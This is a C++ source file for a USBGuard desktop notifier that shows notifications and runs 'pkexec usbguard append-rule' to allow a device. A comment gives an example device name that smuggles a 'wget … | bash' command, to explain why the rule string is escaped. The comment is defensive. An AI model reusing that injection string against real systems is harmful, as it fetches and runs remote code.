/*
 * Copyright (C) 2019 Red Hat, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * Author(s): Zoltán Fridrich <zfridric@redhat.com>
 */

#include "NotifyWrapper.hpp"

#include <stdexcept>

#include <iostream> //std::cerr
#include <unistd.h>

#include <librsvg-2.0/librsvg/rsvg.h>

#include "Notifier.hpp"
#include "Log.hpp"


extern char _binary_icons_usbguard_icon_svg_start[];
extern char _binary_icons_usbguard_icon_svg_end[];

namespace notify
{

Notify::Notify(const std::string& app_name)
{
    if (!notify_init(app_name.c_str())) {
        throw std::runtime_error("Failed to initialize libnotify");
    }
}

Notify::~Notify()
{
    notify_uninit();
}

std::string Notify::getAppName() const noexcept
{
    return { notify_get_app_name() };
}

void Notify::setAppName(const std::string& app_name)
{
    notify_set_app_name(app_name.c_str());
}

Notification::Notification(const std::string& summary, const std::string& body)
    : _n(notify_notification_new(summary.c_str(), body.c_str(), nullptr))
{
    RsvgHandle* handle = rsvg_handle_new_from_data(
            (const guint8*)(_binary_icons_usbguard_icon_svg_start),
            _binary_icons_usbguard_icon_svg_end - _binary_icons_usbguard_icon_svg_start,
            nullptr);
    if (!handle) {
        throw std::runtime_error("Failed to obtain rsvg handle");
    }
    GdkPixbuf* pixbuf = rsvg_handle_get_pixbuf(handle);
    notify_notification_set_image_from_pixbuf(_n, pixbuf);
    g_object_unref(handle);
}

bool Notification::update(const std::string& summary, const std::string& body)
{
    return notify_notification_update(_n, summary.c_str(), body.c_str(), nullptr);
}

bool Notification::show() const
{
    return notify_notification_show(_n, nullptr);
}

void Notification::replaceAll(std::string& str, const std::string& from, const std::string& to)
{
    if (from.empty()) {
        return;
    }
    size_t start_pos = 0;
    while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
    }
}

void Notification::allowDeviceSystemCommand(usbguard::Rule& rule, bool isPermanent)
{
    std::string command;
    std::string escaped_rule;


    escaped_rule = rule.toString();
    replaceAll(escaped_rule, "\'", "\"\'\"\'\"\'\"");
    //prevent bugs and command injection from devices with a ' in their name
    //eg: "innocent usb stick' & ; wget -O - evil.sh | bash '"

    command.append("pkexec usbguard append-rule ");
    if (!isPermanent) {
        command.append("-t ");
    }
    command.append("\'");
    command.append(escaped_rule);
    command.append("\' > /dev/null");

    pid_t pid = fork();
    if (pid == 0) {
        int exit_code = system(command.c_str());
        if (exit_code == 127)
            std::cerr << "pkexec is not installed on your system" <<
                "(needed for adding an usbguard rule)" << std::endl;
    }
}

void Notification::allowDeviceNotifierIPC(AllowDeviceActionData* data, bool isPermanent)
{
    try {
        data->notifier->appendRule(data->rule.toString(), usbguard::Rule::LastID, isPermanent);
    } catch (const usbguard::Exception& e) {
        std::cerr << "cannot add USBGuard rule: " << e.reason() << std::endl;
    }

}

void Notification::allowDeviceActionCallback(NotifyNotification* notification,
    char* action,
    gpointer user_data)
{
    //TODO add GUI options to set these variables?
    bool isPermanent = true;
    bool allowAnyPort = true;

    AllowDeviceActionData* data = (AllowDeviceActionData*)user_data;

    (void)(action);
    data->rule.setTarget(usbguard::Rule::Target::Allow);

    if (allowAnyPort) {
        data->rule.attributeViaPort().clear();
    }

    NOTIFIER_LOG() << "allowing device " << data->rule.getName();

    allowDeviceSystemCommand(data->rule, isPermanent);
    //allowDeviceNotifierIPC(data, isPermanent);

    if (user_data) {
        free(user_data);
    }

    notify_notification_close(notification, NULL);
    g_object_unref(G_OBJECT(notification));
}

void Notification::setAllowAction(usbguard::Rule& rule,
    usbguardNotifier::Notifier* notifier) noexcept
{
    AllowDeviceActionData* data = new AllowDeviceActionData(rule, notifier);

    notify_notification_add_action(_n, "allow", "allow device", allowDeviceActionCallback, (gpointer)data, NULL);
}

void Notification::setTimeout(int timeout) noexcept
{
    notify_notification_set_timeout(_n, timeout);
}

void Notification::setCategory(const std::string& category) noexcept
{
    notify_notification_set_category(_n, category.c_str());
}

void Notification::setUrgency(Urgency urgency) noexcept
{
    notify_notification_set_urgency(_n, (NotifyUrgency)urgency);
}

bool Notification::close() const
{
    return notify_notification_close(_n, nullptr);
}

} // namespace notify
